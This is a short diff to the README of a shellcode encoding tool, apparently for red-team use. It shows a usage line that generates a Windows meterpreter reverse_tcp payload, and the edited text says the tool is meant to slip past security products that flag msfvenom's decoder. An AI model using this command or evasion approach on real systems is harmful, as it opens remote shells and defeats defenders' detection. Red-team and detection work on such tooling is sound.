@@ -10,7 +10,7 @@ python senc.py -p windows/meterpreter/reverse_tcp -lhost eth0 -lport 443 -e rot 
 TODO - print cssharp decrypt function.
 
 This is mainly for:
-Avoiding getting flagged because of msfvenom builtin decoder which is a red flag for any security solution.
+Avoiding getting flagged because of msfvenom meterpreter encoded builtin decoder which is a red flag for any security solution.
 
 1 - using with a shellcode runner with decryption routine implemented.
 
